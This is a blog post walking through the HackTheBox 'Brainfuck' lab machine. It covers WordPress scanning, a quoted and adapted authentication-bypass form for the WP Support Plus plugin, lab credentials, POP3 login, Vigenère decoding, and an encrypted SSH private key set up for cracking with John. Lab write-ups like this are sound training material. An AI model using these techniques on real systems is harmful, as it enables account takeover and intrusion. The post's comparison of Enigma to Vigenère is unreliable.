<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Brainfuck | This box was really a Brainfuck. It requires some knowledge of cryptography for you to be able to recognize patterns and get on the right...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">

  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
  <script src="/tipuesearch_content.js"></script>
  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
  <script src="/theme/tipuesearch/tipuesearch.js"></script>
 


<meta name="keywords" content="HackTheBox">


  <title>Brainfuck</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation"> 
	  
		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
		</form>
		
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="htts://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
<i class="fa fa-twitter fa-lg"></i></a>
                <a href="https://github.com/M4rc0ff" title="github" >
<i class="fa fa-github fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2019-12-18 19:05:00+00:00">Wed 18 December 2019</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Brainfuck.html">Brainfuck</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Brainfuck.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <p>This box was really a Brainfuck. It requires some knowledge of cryptography for you to be able to recognize patterns and get on the right track. Although I found it a bit unrealistic it is still a good box to practice your skills. My suggestion is always to try hard yourself and only when you have been stuck for a considerable amount of time look for hints.</p>
<h1 id="recon">Recon</h1>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -sV -sC <span class="m">10</span>.10.10.17
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 07:10 GMT</span>
<span class="go">Nmap scan report for brainfuck.htb (10.10.10.17)</span>
<span class="go">Host is up (0.13s latency).</span>
<span class="go">Not shown: 995 filtered ports</span>
<span class="go">PORT    STATE SERVICE  VERSION</span>
<span class="go">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span>
<span class="go">| ssh-hostkey: </span>
<span class="go">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span>
<span class="go">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span>
<span class="go">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span>
<span class="go">25/tcp  open  smtp     Postfix smtpd</span>
<span class="go">|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span>
<span class="go">110/tcp open  pop3     Dovecot pop3d</span>
<span class="go">|_pop3-capabilities: UIDL AUTH-RESP-CODE USER CAPA SASL(PLAIN) PIPELINING RESP-CODES TOP</span>
<span class="go">143/tcp open  imap     Dovecot imapd</span>
<span class="go">|_imap-capabilities: IDLE LOGIN-REFERRALS more IMAP4rev1 have OK Pre-login ID post-login SASL-IR listed LITERAL+ capabilities ENABLE AUTH=PLAINA0001</span>
<span class="go">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span>
<span class="go">|_http-server-header: nginx/1.10.0 (Ubuntu)</span>
<span class="go">|_http-title: 400 The plain HTTP request was sent to HTTPS port</span>
<span class="go">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span>
<span class="go">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span>
<span class="go">| Not valid before: 2017-04-13T11:19:29</span>
<span class="go">|_Not valid after:  2027-04-11T11:19:29</span>
<span class="go">|_ssl-date: TLS randomness does not represent time</span>
<span class="go">| tls-alpn: </span>
<span class="go">|_  http/1.1</span>
<span class="go">| tls-nextprotoneg: </span>
<span class="go">|_  http/1.1</span>
<span class="go">Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds</span>
</pre></div>


<p>From the initial nmap we can observe five open ports, one of which (443) points to a webserver. Let us have a look at it.</p>
<p><img alt="" src="../images/brainfuck-nginx.png"></p>
<p>We can see the simple Nginix welcome page. From the nmap we can also see two alternative DNS names: <strong>www.brainfuck.htb</strong> and <strong>sup3rs3cr3t.brainfuck.htb</strong>. To be able to see what's behind these names we can add an entry in the <code>/etc/hosts</code> file of our personal box so that it can resolve them.</p>
<div class="highlight"><pre><span></span><span class="go">127.0.0.1       localhost</span>
<span class="go">::1             localhost ip6-localhost ip6-loopback SittingDucks</span>
<span class="go">ff02::1         ip6-allnodes</span>
<span class="go">ff02::2         ip6-allrouters</span>

<span class="go">127.0.1.1 SittingDucks</span>
<span class="go">10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb</span>
</pre></div>


<p>So now we can try to navigate to the first website with our browser:</p>
<p><img alt="" src="../images/brainfuck-wp.png"></p>
<p>We can see what it looks like a wordpress website and another potential useful information could be the email <strong>orestis@brainfuck.htb</strong>.</p>
<p>Since we are apparently dealing with wordpress then we can use the powerful <a href="https://wpscan.org/">wpscan</a> tool to check for vulnerabilities or other weaknessed we can leverage.</p>
<p>As I initilally got TLS errors I then ran a scan with the tls checks option disabled:</p>
<div class="highlight"><pre><span></span><span class="go">_______________________________________________________________</span>
<span class="go">         __          _______   _____</span>
<span class="go">         \ \        / /  __ \ / ____|</span>
<span class="go">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ</span>
<span class="go">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \</span>
<span class="go">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
<span class="go">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>

<span class="go">         WordPress Security Scanner by the WPScan Team</span>
<span class="go">                         Version 3.7.5</span>
<span class="go">       Sponsored by Automattic - https://automattic.com/</span>
<span class="go">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span>
<span class="go">_______________________________________________________________</span>

<span class="go">[32m[+][0m URL: https://brainfuck.htb/</span>
<span class="go">[32m[+][0m Started: Fri Dec 27 05:59:53 2019</span>

<span class="go">Interesting Finding(s):</span>

<span class="go">[32m[+][0m https://brainfuck.htb/</span>
<span class="go"> | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)</span>
<span class="go"> | Found By: Headers (Passive Detection)</span>
<span class="go"> | Confidence: 100%</span>

<span class="go">[32m[+][0m https://brainfuck.htb/xmlrpc.php</span>
<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="go"> | Confidence: 100%</span>
<span class="go"> | References:</span>
<span class="go"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
<span class="go"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>

<span class="go">[32m[+][0m https://brainfuck.htb/readme.html</span>
<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="go"> | Confidence: 100%</span>

<span class="go">[32m[+][0m https://brainfuck.htb/wp-cron.php</span>
<span class="go"> | Found By: Direct Access (Aggressive Detection)</span>
<span class="go"> | Confidence: 60%</span>
<span class="go"> | References:</span>
<span class="go"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
<span class="go"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>

<span class="go">[32m[+][0m WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).</span>
<span class="go"> | Found By: Rss Generator (Passive Detection)</span>
<span class="go"> |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;</span>
<span class="go"> |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;</span>

<span class="go">[32m[+][0m WordPress theme in use: proficient</span>
<span class="go"> | Location: https://brainfuck.htb/wp-content/themes/proficient/</span>
<span class="go"> | Last Updated: 2019-12-13T00:00:00.000Z</span>
<span class="go"> | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt</span>
<span class="go"> | [33m[!][0m The version is out of date, the latest version is 3.0.5</span>
<span class="go"> | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3</span>
<span class="go"> | Style Name: Proficient</span>
<span class="go"> | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...</span>
<span class="go"> | Author: Specia</span>
<span class="go"> | Author URI: https://speciatheme.com/</span>
<span class="go"> |</span>
<span class="go"> | Found By: Css Style In Homepage (Passive Detection)</span>
<span class="go"> |</span>
<span class="go"> | Version: 1.0.6 (80% confidence)</span>
<span class="go"> | Found By: Style (Passive Detection)</span>
<span class="go"> |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: &#39;Version: 1.0.6&#39;</span>

<span class="go">[32m[+][0m Enumerating Vulnerable Plugins (via Passive Methods)</span>
<span class="go">[32m[+][0m Checking Plugin Versions (via Passive and Aggressive Methods)</span>

<span class="go">[34m[i][0m No plugins Found.</span>

<span class="go">[32m[+][0m Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span>

<span class="go"> Checking Known Locations -: |=======================================================|</span>
<span class="go">[32m[+][0m Checking Theme Versions (via Passive and Aggressive Methods)</span>

<span class="go">[34m[i][0m No themes Found.</span>

<span class="go">[32m[+][0m Enumerating Timthumbs (via Passive and Aggressive Methods)</span>

<span class="go"> Checking Known Locations -: |=======================================================|</span>

<span class="go">[34m[i][0m No Timthumbs Found.</span>

<span class="go">[32m[+][0m Enumerating Config Backups (via Passive and Aggressive Methods)</span>

<span class="go"> Checking Config Backups -: |========================================================|</span>

<span class="go">[34m[i][0m No Config Backups Found.</span>

<span class="go">[32m[+][0m Enumerating DB Exports (via Passive and Aggressive Methods)</span>

<span class="go"> Checking DB Exports -: |============================================================|</span>

<span class="go">[34m[i][0m No DB Exports Found.</span>

<span class="go">[32m[+][0m Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span>

<span class="go"> Brute Forcing Attachment IDs -: |===================================================|</span>

<span class="go">[34m[i][0m No Medias Found.</span>

<span class="go">[32m[+][0m Enumerating Users (via Passive and Aggressive Methods)</span>

<span class="go"> Brute Forcing Author IDs -: |=======================================================|</span>

<span class="go">[34m[i][0m User(s) Identified:</span>

<span class="go">[32m[+][0m admin</span>
<span class="go"> | Found By: Author Posts - Display Name (Passive Detection)</span>
<span class="go"> | Confirmed By:</span>
<span class="go"> |  Rss Generator (Passive Detection)</span>
<span class="go"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
<span class="go"> |  Login Error Messages (Aggressive Detection)</span>

<span class="go">[32m[+][0m administrator</span>
<span class="go"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
<span class="go"> | Confirmed By: Login Error Messages (Aggressive Detection)</span>

<span class="go">[33m[!][0m No WPVulnDB API Token given, as a result vulnerability data has not been output.</span>
<span class="go">[33m[!][0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.</span>

<span class="go">[32m[+][0m Finished: Fri Dec 27 06:01:31 2019</span>
<span class="go">[32m[+][0m Requests Done: 3109</span>
<span class="go">[32m[+][0m Cached Requests: 11</span>
<span class="go">[32m[+][0m Data Sent: 782.499 KB</span>
<span class="go">[32m[+][0m Data Received: 849.91 KB</span>
<span class="go">[32m[+][0m Memory used: 198.396 MB</span>
<span class="go">[32m[+][0m Elapsed time: 00:01:38</span>
</pre></div>


<p>There are plenty of useful info in the above output but one thing I learnt while dealing with wordpress is that people do not always update the wordpress plugins. In fact, after skimming through the list carefully and searching on the Internet, it looks like the plugin <strong>WP Support Plus Responsive Ticketing System</strong> is quite outdated (version 7.1.3)</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> searchsploit WordPress Plugin WP Support Plus Responsive
<span class="go">--------------------------------------------- ----------------------------------------</span>
<span class="go"> Exploit Title                               |  Path</span>
<span class="go">                                             | (/usr/share/exploitdb/)</span>
<span class="go">--------------------------------------------- ----------------------------------------</span>
<span class="go">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/34589.txt</span>
<span class="go">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/40939.txt</span>
<span class="go">WordPress Plugin WP Support Plus Responsive  | exploits/php/webapps/41006.txt</span>
<span class="go">--------------------------------------------- ----------------------------------------</span>
</pre></div>


<p>looking on searchsploit for the plugin in question I can see there are three exploits. Also seems like 41006 may be useful as it can let us login.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> cat /usr/share/exploitdb/exploits/php/webapps/41006.txt
<span class="gp">#</span> Exploit Title: WP Support Plus Responsive Ticket System <span class="m">7</span>.1.3 Privilege Escalation
<span class="gp">#</span> Date: <span class="m">10</span>-01-2017
<span class="gp">#</span> Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
<span class="gp">#</span> Exploit Author: Kacper Szurek
<span class="gp">#</span> Contact: http://twitter.com/KacperSzurek
<span class="gp">#</span> Website: http://security.szurek.pl/
<span class="gp">#</span> Category: web

<span class="go">1. Description</span>

<span class="go">You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().</span>

<span class="go">http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html</span>

<span class="go">2. Proof of Concept</span>

<span class="go">&lt;form method=&quot;post&quot; action=&quot;http://wp/wp-admin/admin-ajax.php&quot;&gt;</span>
<span class="go">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;administrator&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;sth&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span>
<span class="go">&lt;/form&gt;</span>
</pre></div>


<p>All we have to do in this case is to put the PoC of the above output on a file and save it as html with few modifications:</p>
<div class="highlight"><pre><span></span><span class="go">&lt;form method=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;</span>
<span class="go">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;administrator&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;orestis@brainfuck.htb&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;</span>
<span class="go">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span>
<span class="go">&lt;/form&gt;</span>
</pre></div>


<p>So I change the url to https://brainfuck.htb. We found two users with wpscan, "admin" and "administrator" so we can probably leave the latter there. We also add the email I found.</p>
<p>Then from the same directory where I save that html I run a simple python http server.</p>
<p><img alt="" src="../images/bf-administrator.png"></p>
<p>From my browser I enter the url of the location of the exploit and I get the result above, so I click on login. After a bit of loading seemed nothing happened, I got a blank page. However, I opened another tab in the browser and navigated again to https://brainfuck.htb and got this:</p>
<p><img alt="" src="../images/bf-login.png"></p>
<p>same page as before but on the upper right site we can see I am now logged in as administrator. In fact, I can navigate to the administrtor personal profile:</p>
<p><img alt="" src="../images/bf-profile.png"></p>
<p>I started exploring but I did not find anything useful. I have been particularly looking for a place where I could upload some php code that would potentially give me a shell. So I decided to try the same process with the other user, "admin". With admin I got way more menu options including one to upload media, themes, etc.</p>
<p>Unfortunately, whether I try to upload a php webshell hidden into a jpg file or I try to edit one of the existing php theme functions there is a major issue, that is these files are not writable probably as an extra security measure.</p>
<p>In fact, when trying to upload an image I get this error:</p>
<p><strong><em>Unable to create directory wp-content/uploads/2019/12. Is it parent directory writable by the server?</em></strong></p>
<p>Instead, in the edit themes session I can see this message:</p>
<p><strong><em>You need to make this file writable before you can save your changes. See the Codex for more information.</em></strong></p>
<p>I spent quite some time online looking for a solution but looks like these permissions can only be changed manually from configuration files which we do not have access to (yet). </p>
<p>In the end I opted for another path. From the nmap scan we saw SMTP, POP3 and IMAP ports are open. I also see that there is a wordpress plugin installed on the website called <strong>Easy WP SMTP</strong>. When I go to the plugin configuration page I see the credentials and other details. The password is obfuscated but we can see it easily by opening the browser inspector as shown in the below screenshot.</p>
<p><img alt="" src="../images/bf-smtp.png"></p>
<p>So we have the SMTP credentials: </p>
<p><code>username --&gt; orestis</code></p>
<p><code>password --&gt; kHGuERB29DNiNE</code></p>
<p>Now we can loging to the POP3 server and read the messages:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> telnet <span class="m">10</span>.10.10.17 <span class="m">110</span>
<span class="go">Trying 10.10.10.17...</span>
<span class="go">Connected to 10.10.10.17.</span>
<span class="go">Escape character is &#39;^]&#39;.</span>
<span class="go">+OK Dovecot ready.</span>
<span class="go">USER orestis</span>
<span class="go">+OK</span>
<span class="go">PASS kHGuERB29DNiNE</span>
<span class="go">+OK Logged in.</span>
<span class="go">LIST</span>
<span class="go">+OK 2 messages:</span>
<span class="go">1 977</span>
<span class="go">2 514</span>
<span class="go">.</span>
<span class="go">RETR 2</span>
<span class="go">+OK 514 octets</span>
<span class="go">Return-Path: &lt;root@brainfuck.htb&gt;</span>
<span class="go">X-Original-To: orestis</span>
<span class="go">Delivered-To: orestis@brainfuck.htb</span>
<span class="go">Received: by brainfuck (Postfix, from userid 0)</span>
<span class="go">        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)</span>
<span class="go">To: orestis@brainfuck.htb</span>
<span class="go">Subject: Forum Access Details</span>
<span class="go">Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;</span>
<span class="go">Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)</span>
<span class="go">From: root@brainfuck.htb (root)</span>

<span class="go">Hi there, your credentials for our &quot;secret&quot; forum are below :)</span>

<span class="go">username: orestis</span>
<span class="go">password: kIEnnfEKJ#9UmdO</span>

<span class="go">Regards</span>
</pre></div>


<p>There are two emails and only one had useful info. In fact, it contains some credentials I used to successfully login to sup3rs3cr3t.brainfuck.htb. </p>
<p>In here there are two interesting discussion threads about an ssh key but the most interesting part is encrypted. From the post in clear text I notice orestis always ends his comments with the sentence </p>
<p><strong><em>Orestis - Hacking for fun and profit</em></strong>.  </p>
<p>Then in the encrypted post I can see orestis ends the three comments like this:</p>
<p><strong><em>Pieagnm - Jkoijeg nbw zwx mle grwsnn</em></strong></p>
<p><strong><em>Wejmvse - Fbtkqal zqb rso rnl cwihsf</em></strong></p>
<p><strong><em>Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</em></strong></p>
<p>so we can see there is a similar pattern but the cypher-text is different every time. If you are a bit familiar with cryptography, this seems similar 
to the <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenere cipher</a> which is an evolution of the Caesar substitution. With Vigenere, a message is encrypted using a shared key and a table that contains the 26 letters of the Latin alphabet. </p>
<p>This looks to be the same encryption used by the Enigma machine in the WW2. The Enigma was eventually cracked because the Germans placed ‚ÄúHeil Hitler‚Äù at the end of every message. Similarly we can use the same strategy but instead we will have the sentence "Orestis - Hacking for fun and profit" at the end of each message which will lead us to crack Enigma.</p>
<p>That being said, we will use a one time pad decoder first to find the key:</p>
<p><img alt="" src="../images/pad1.png"></p>
<p><img alt="" src="../images/pad2.png"></p>
<p><img alt="" src="../images/pad3.png"></p>
<p>As we can see from the three screenshots above the common key that is repeated in sequence is <strong>fuckmybrain</strong></p>
<p>Once we have this info we can use the vigenere decoder to derypt the interesting bit, that is the ssh key:</p>
<p><img alt="" src="../images/vigerene.png"></p>
<p>Using the link we decrypted we can now see this ssh key:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Downloads#</span> cat id_rsa 
<span class="go">-----BEGIN RSA PRIVATE KEY-----</span>
<span class="go">Proc-Type: 4,ENCRYPTED</span>
<span class="go">DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382</span>

<span class="go">mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/</span>
<span class="go">B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi</span>
<span class="go">W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ</span>
<span class="go">7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ</span>
<span class="go">zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum</span>
<span class="go">oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem</span>
<span class="go">dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+</span>
<span class="go">Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT</span>
<span class="go">mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs</span>
<span class="go">LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq</span>
<span class="go">ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59</span>
<span class="go">krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V</span>
<span class="go">gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA</span>
<span class="go">VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn</span>
<span class="go">schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt</span>
<span class="go">UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn</span>
<span class="go">F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M</span>
<span class="go">wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab</span>
<span class="go">Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy</span>
<span class="go">IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF</span>
<span class="go">mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP</span>
<span class="go">CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF</span>
<span class="go">9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS</span>
<span class="go">EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi</span>
<span class="go">6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ</span>
<span class="go">-----END RSA PRIVATE KEY-----</span>
</pre></div>


<p>Since the key is encrypted we can try to brute force it using <a href="https://tools.SittingDucks.org/password-attacks/john">John</a>. Before we can use John to bute force the key we need to convert the ssh key in a format John can work with. To do so we can use a tool called <a href="https://raw.githubusercontent.com/stricture/hashstack-server-plugin-jtr/master/scrapers/sshng2john.py">sshng2john</a>.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> ./sshng2john.py /home/user/Downloads/id_rsa &gt; id_rsa_john
<span class="gp">root@SittingDucks:~#</span> cat id_rsa_john 
<span class="go">16</span>
